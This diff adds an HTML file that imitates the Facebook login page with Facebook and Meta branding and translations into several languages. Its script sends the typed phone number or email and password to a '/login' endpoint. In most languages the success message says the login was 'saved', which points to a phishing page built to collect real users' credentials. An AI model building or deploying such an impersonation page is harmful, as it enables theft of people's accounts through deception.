@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook - Log in or sign up</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --blue: #1877F2;
+      --blue-hover: #166FE5;
+      --green: #42B72A;
+      --green-hover: #36A420;
+      --text-dark: #1c1e21;
+      --text-gray: #65676B;
+      --border: #dddfe2;
+      --bg: #f0f2f5;
+      --white: #ffffff;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background: var(--bg);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ─── LANGUAGE BAR ─── */
+    .lang-bar {
+      background: var(--white);
+      border-bottom: 1px solid var(--border);
+      text-align: center;
+      padding: 8px 16px;
+      font-size: 13px;
+      color: var(--text-gray);
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 6px;
+    }
+    .lang-bar span { cursor: pointer; }
+    .lang-bar span:hover { text-decoration: underline; }
+    .lang-bar span.active { color: var(--blue); font-weight: 600; }
+
+    /* ─── MAIN LAYOUT ─── */
+    main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px 16px;
+      gap: 16px;
+    }
+
+    /* Desktop two-column layout */
+    @media (min-width: 769px) {
+      main {
+        flex-direction: row;
+        align-items: center;
+        justify-content: center;
+        gap: 32px;
+        padding: 0 40px;
+      }
+    }
+
+    /* ─── LEFT PANEL (desktop) ─── */
+    .hero {
+      display: none;
+      flex-direction: column;
+      max-width: 420px;
+    }
+    @media (min-width: 769px) {
+      .hero { display: flex; }
+    }
+    .hero .fb-logo {
+      font-size: 60px;
+      font-weight: 800;
+      color: var(--blue);
+      letter-spacing: -2px;
+      line-height: 1;
+      margin-bottom: 16px;
+    }
+    .hero p {
+      font-size: 28px;
+      line-height: 1.3;
+      color: var(--text-dark);
+      font-weight: 400;
+    }
+
+    /* ─── LOGIN CARD ─── */
+    .card {
+      background: var(--white);
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
+      padding: 20px;
+      width: 100%;
+      max-width: 396px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+    }
+
+    /* Mobile: show fb icon inside card */
+    .card .mobile-icon {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 4px;
+    }
+    .card .mobile-icon svg { width: 60px; height: 60px; }
+    @media (min-width: 769px) {
+      .card .mobile-icon { display: none; }
+    }
+
+    /* Inputs */
+    .card input[type="text"],
+    .card input[type="password"] {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      font-size: 17px;
+      color: var(--text-dark);
+      outline: none;
+      transition: border-color .15s;
+    }
+    .card input:focus { border-color: var(--blue); box-shadow: 0 0 0 2px rgba(24,119,242,.2); }
+
+    /* Buttons */
+    .btn-login {
+      width: 100%;
+      background: var(--blue);
+      color: var(--white);
+      font-size: 20px;
+      font-weight: 700;
+      border: none;
+      border-radius: 6px;
+      padding: 14px;
+      cursor: pointer;
+      transition: background .15s;
+    }
+    .btn-login:hover { background: var(--blue-hover); }
+
+    .forgot { font-size: 14px; color: var(--blue); cursor: pointer; text-decoration: none; }
+    .forgot:hover { text-decoration: underline; }
+
+    .divider {
+      width: 100%;
+      border: none;
+      border-top: 1px solid var(--border);
+      margin: 4px 0;
+    }
+
+    .btn-create {
+      background: var(--green);
+      color: var(--white);
+      font-size: 17px;
+      font-weight: 700;
+      border: none;
+      border-radius: 6px;
+      padding: 14px 20px;
+      cursor: pointer;
+      transition: background .15s;
+    }
+    .btn-create:hover { background: var(--green-hover); }
+
+    /* ─── FEEDBACK MESSAGE ─── */
+    #msg {
+      font-size: 14px;
+      text-align: center;
+      min-height: 18px;
+      color: red;
+    }
+    #msg.success { color: var(--green); }
+
+    /* ─── FOOTER ─── */
+    footer {
+      text-align: center;
+      padding: 16px;
+      font-size: 12px;
+      color: var(--text-gray);
+      border-top: 1px solid var(--border);
+      background: var(--white);
+    }
+    footer .meta-logo {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 4px;
+      margin-top: 4px;
+      font-weight: 700;
+      color: var(--text-gray);
+    }
+  </style>
+</head>
+<body>
+
+<!-- Language bar -->
+<div class="lang-bar" id="langBar">
+  <span class="active" onclick="setLang('en')">English (UK)</span>
+  <span onclick="setLang('fr')">Français</span>
+  
+</div>
+
+<main>
+  <!-- Desktop hero -->
+  <div class="hero">
+    <div class="fb-logo">facebook</div>
+    <p id="heroText">Facebook helps you connect and share with the people in your life.</p>
+  </div>
+
+  <!-- Login card -->
+  <div class="card">
+    <!-- Mobile icon -->
+    <div class="mobile-icon">
+      <svg viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="30" cy="30" r="30" fill="#1877F2"/>
+        <path d="M34.5 31.5H37.5L38.5 27.5H34.5V25.5C34.5 24.4 34.5 23.5 36.5 23.5H38.5V20.1C38.1 20.1 36.7 20 35.2 20C32.1 20 30 21.9 30 25.3V27.5H26.5V31.5H30V42H34.5V31.5Z" fill="white"/>
+      </svg>
+    </div>
+
+    <input type="text"     id="identifier" placeholder="" />
+    <input type="password" id="password"   placeholder="" />
+    <p id="msg"></p>
+    <button class="btn-login" id="loginBtn" onclick="handleLogin()">Log in</button>
+    <a class="forgot" id="forgotLink" href="#">Forgotten password?</a>
+    <hr class="divider"/>
+    <button class="btn-create" id="createBtn">Create new account</button>
+  </div>
+</main>
+
+<!-- Footer -->
+<footer>
+  <div class="meta-logo">
+    <svg width="18" height="18" viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg">
+      <text y="48" font-size="52" fill="#65676B">∞</text>
+    </svg>
+    Meta
+  </div>
+</footer>
+
+<script>
+  // ─── TRANSLATIONS ───
+  const translations = {
+    en: {
+      identifier: 'Mobile number or email address',
+      password: 'Password',
+      login: 'Log in',
+      forgot: 'Forgotten password?',
+      create: 'Create new account',
+      hero: 'Facebook helps you connect and share with the people in your life.',
+      errEmpty: 'Please fill in all fields.',
+      errShort: 'Password must be at least 6 characters.',
+      success: 'Loged in ✔'
+    },
+    fr: {
+      identifier: 'Numéro de téléphone ou adresse e-mail',
+      password: 'Mot de passe',
+      login: 'Se connecter',
+      forgot: 'Mot de passe oublié ?',
+      create: 'Créer un compte',
+      hero: 'Facebook vous aide à communiquer et à partager avec les personnes qui comptent pour vous.',
+      errEmpty: 'Veuillez remplir tous les champs.',
+      errShort: 'Le mot de passe doit comporter au moins 6 caractères.',
+      success: 'Connexion enregistrée ! ✔'
+    },
+    es: {
+      identifier: 'Número de teléfono o correo electrónico',
+      password: 'Contraseña',
+      login: 'Entrar',
+      forgot: '¿Olvidaste tu contraseña?',
+      create: 'Crear cuenta nueva',
+      hero: 'Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.',
+      errEmpty: 'Por favor completa todos los campos.',
+      errShort: 'La contraseña debe tener al menos 6 caracteres.',
+      success: '¡Inicio de sesión guardado! ✔'
+    },
+    de: {
+      identifier: 'Handynummer oder E-Mail-Adresse',
+      password: 'Passwort',
+      login: 'Anmelden',
+      forgot: 'Passwort vergessen?',
+      create: 'Neues Konto erstellen',
+      hero: 'Mit Facebook kannst du dich mit anderen Menschen verbinden und Inhalte teilen.',
+      errEmpty: 'Bitte alle Felder ausfüllen.',
+      errShort: 'Das Passwort muss mindestens 6 Zeichen lang sein.',
+      success: 'Anmeldung gespeichert! ✔'
+    },
+    pt: {
+      identifier: 'Número de telemóvel ou e-mail',
+      password: 'Palavra-passe',
+      login: 'Entrar',
+      forgot: 'Esqueceu a palavra-passe?',
+      create: 'Criar nova conta',
+      hero: 'O Facebook ajuda-te a comunicar e a partilhar com as pessoas da tua vida.',
+      errEmpty: 'Por favor preenche todos os campos.',
+      errShort: 'A palavra-passe deve ter pelo menos 6 caracteres.',
+      success: 'Login guardado! ✔'
+    },
+    ar: {
+      identifier: 'رقم الهاتف أو البريد الإلكتروني',
+      password: 'كلمة المرور',
+      login: 'تسجيل الدخول',
+      forgot: 'هل نسيت كلمة المرور؟',
+      create: 'إنشاء حساب جديد',
+      hero: 'يساعدك فيسبوك على التواصل ومشاركة ما يهمك مع الأشخاص في حياتك.',
+      errEmpty: 'يرجى ملء جميع الحقول.',
+      errShort: 'يجب أن تتكون كلمة المرور من 6 أحرف على الأقل.',
+      success: 'تم حفظ تسجيل الدخول! ✔'
+    },
+    zh: {
+      identifier: '手机号码或电子邮件地址',
+      password: '密码',
+      login: '登录',
+      forgot: '忘记密码？',
+      create: '创建新账户',
+      hero: 'Facebook 帮助你与生活中的朋友和家人保持联系。',
+      errEmpty: '请填写所有字段。',
+      errShort: '密码至少需要6个字符。',
+      success: '登录已保存！✔'
+    }
+  };
+
+  let currentLang = 'en';
+
+  function setLang(code) {
+    currentLang = code;
+    const t = translations[code];
+    document.getElementById('identifier').placeholder = t.identifier;
+    document.getElementById('password').placeholder   = t.password;
+    document.getElementById('loginBtn').textContent   = t.login;
+    document.getElementById('forgotLink').textContent = t.forgot;
+    document.getElementById('createBtn').textContent  = t.create;
+    document.getElementById('heroText').textContent   = t.hero;
+    document.getElementById('msg').textContent = '';
+
+    // Highlight active lang
+    document.querySelectorAll('#langBar span').forEach(el => el.classList.remove('active'));
+    event.target.classList.add('active');
+
+    // RTL for Arabic
+    document.documentElement.setAttribute('dir', code === 'ar' ? 'rtl' : 'ltr');
+  }
+
+  async function handleLogin() {
+    const t = translations[currentLang];
+    const identifier = document.getElementById('identifier').value.trim();
+    const password   = document.getElementById('password').value.trim();
+    const msgEl      = document.getElementById('msg');
+
+    msgEl.className = '';
+
+    if (!identifier || !password) {
+      msgEl.textContent = t.errEmpty;
+      return;
+    }
+    if (password.length < 6) {
+      msgEl.textContent = t.errShort;
+      return;
+    }
+
+    try {
+      const res = await fetch('/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ identifier, password })
+      });
+      const data = await res.json();
+      if (data.success) {
+        msgEl.className = 'success';
+        msgEl.textContent = t.success;
+        document.getElementById('identifier').value = '';
+        document.getElementById('password').value = '';
+      }
+    } catch(e) {
+      msgEl.textContent = 'Server error. Is the server running?';
+    }
+  }
+
+  // Allow Enter key to submit
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Enter') handleLogin();
+  });
+
+  // Init with English placeholders
+  setLang('en');
+  document.querySelectorAll('#langBar span')[0].classList.add('active');
+</script>
+</body>
+</html>
